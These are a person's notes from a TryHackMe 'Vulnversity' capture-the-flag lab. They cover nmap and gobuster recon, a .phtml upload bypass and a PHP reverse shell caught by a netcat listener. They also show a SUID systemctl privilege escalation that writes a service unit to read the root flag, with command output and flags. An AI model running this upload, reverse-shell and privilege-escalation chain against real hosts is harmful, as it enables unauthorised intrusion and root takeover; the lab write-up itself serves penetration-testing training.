p1 = 10.10.35.78

nmap -sV -sC 10.10.35.78                                                                                      148 ⨯ 1 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-24 21:48 GMT
Nmap scan report for 10.10.35.78
Host is up (0.032s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2022-01-24T16:48:54-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-01-24T21:48:53
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.01 seconds





nmap -p- 10.10.35.78                                                                                                2 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-24 22:07 GMT
Nmap scan report for Vulnversity.thm (10.10.35.78)
Host is up (0.043s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes

Nmap done: 1 IP address (1 host up) scanned in 36.38 seconds





gobuster dir -u http://10.10.35.78:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt             2 ⚙
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.35.78:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/01/24 22:11:36 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 318] [--> http://10.10.35.78:3333/images/]
/css                  (Status: 301) [Size: 315] [--> http://10.10.35.78:3333/css/]
/js                   (Status: 301) [Size: 314] [--> http://10.10.35.78:3333/js/]
/fonts                (Status: 301) [Size: 317] [--> http://10.10.35.78:3333/fonts/]
/internal             (Status: 301) [Size: 320] [--> http://10.10.35.78:3333/internal/]
/server-status        (Status: 403) [Size: 301]

===============================================================
2022/01/24 22:19:04 Finished
===============================================================



--> next I did a sniper attack in Bur psuite using a php.txt file consisting of: .php, .php2, .php3, .php4, .php5, .phtml -> to check which was accepted by the site. THM room said only .phtml would be accepted but looked>

--> I then proceeded to download the PHP reverse shell from: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
--> I changed the IP to tun0 I have from connecting to openvpn (check at http://10.10.10.10) and kept the port to 1234 (I ended up using a shell already in the system)

--> then I set up a nc listener:
nc -lvnp 1234

--> uploaded the .phtml file and it was a success
--> next would be to navigate to:
http://<ip>:3333?internal/uploads/php-reverse-shell.phtml
--> thi should have executed the payload so I check the listener:
nc -lvnp 1234                                                                                                                                                                                                 148 ⨯ 1 ⚙
listening on [any] 1234 ...
connect to [10.11.59.68] from (UNKNOWN) [10.10.223.40] 39180
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 08:04:36 up 20 min,  0 users,  load average: 0.00, 0.00, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
 
--> got a shell!
--> I started looking aorund, went into /home and saw bill, cd'ed into bill and found the user.txt file:
cd home
$ ls
bill
$ cd bill
$ ls
user.txt
$ cat user.txt
8bd7992fbe8a6ad22a63361004cfcedb
--> an there is the first flag



--> NOW FOR THE PRIVESC:
--> I executed the command:
$ find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null
--> and got the result:
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 76408 Jul 17  2019 /usr/lib/squid/pinger
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 35600 Mar  6  2017 /sbin/mount.cifs
	
	
	
--> I looked up systemctl on GTFObins and got an article which I almost followed step by step (with help from https://tryhackme.com/resources/blog/vulnversity too):
$ pwd
/opt
#1: create the environment variables (as per GTFOBins)
$ TF=$(mktemp).service
#2: create a unit file + assign this to the environment variable - link them (also as per GTFOBins)
#--> remember that rather than using whats on GTFOBins website, replace "id > /tmp/output" with the file we want to read and copy to be created in our current working directory)
$ echo '[Service]
> ExecStart=/bin/bash -c "cat /root/root.txt > /opt/flag"
> [Install]
> WantedBy=multi-user.target' > $TF
#3: run the unit file using systemctl
$ /bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.6A8j2ShIRK.service to /tmp/tmp.6A8j2ShIRK.service.
$ /bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.6A8j2ShIRK.service to /tmp/tmp.6A8j2ShIRK.service.
#4: flag file should now be available to us!
$ ls
flag
$ cat flag
a58ff8579f0a9270368d33a9966c7fd5
	
	:))